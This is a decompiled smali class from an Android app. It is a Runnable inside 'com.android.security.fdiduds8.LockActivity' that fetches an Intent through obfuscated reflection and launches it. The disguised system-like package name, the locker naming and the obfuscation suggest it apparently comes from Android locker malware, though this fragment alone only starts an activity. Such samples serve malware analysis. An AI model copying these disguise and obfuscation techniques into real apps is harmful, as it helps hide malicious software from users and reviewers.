.class public final Lͺ;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field private synthetic ˊ:Lcom/android/security/fdiduds8/LockActivity;

.field private synthetic ˋ:Lcom/android/security/fdiduds8/LockActivity;


# direct methods
.method public constructor <init>(Lcom/android/security/fdiduds8/LockActivity;Lcom/android/security/fdiduds8/LockActivity;)V
    .locals 0

    .line 192
    iput-object p1, p0, Lͺ;->ˋ:Lcom/android/security/fdiduds8/LockActivity;

    iput-object p2, p0, Lͺ;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 5

    .line 195
    invoke-static {}, Lcom/android/security/fdiduds8/LockActivity;->ˎ()I

    .line 196
    sget v0, Lcom/android/security/fdiduds8/LockActivity;->ˊ:I

    sput v0, Lcom/android/security/fdiduds8/LockActivity;->ˎ:I

    .line 197
    iget-object v0, p0, Lͺ;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    invoke-static {v0}, Lcom/android/security/fdiduds8/LockActivity;->ˎ(Lcom/android/security/fdiduds8/LockActivity;)Lcom/android/security/fdiduds8/ZRuntime;

    move-result-object v0

    invoke-virtual {v0}, Lcom/android/security/fdiduds8/ZRuntime;->getSystemUtils()Ljava/lang/Object;

    move-result-object v1

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0

    :goto_0
    const-string v0, "CoN"

    :try_start_0
    invoke-static {v0}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v2, "\u141d"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/Intent;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-object v4, v0

    .line 198
    iget-object v0, p0, Lͺ;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    const/16 v1, 0xa

    invoke-virtual {v0, v4, v1}, Lcom/android/security/fdiduds8/LockActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 199
    return-void
.end method
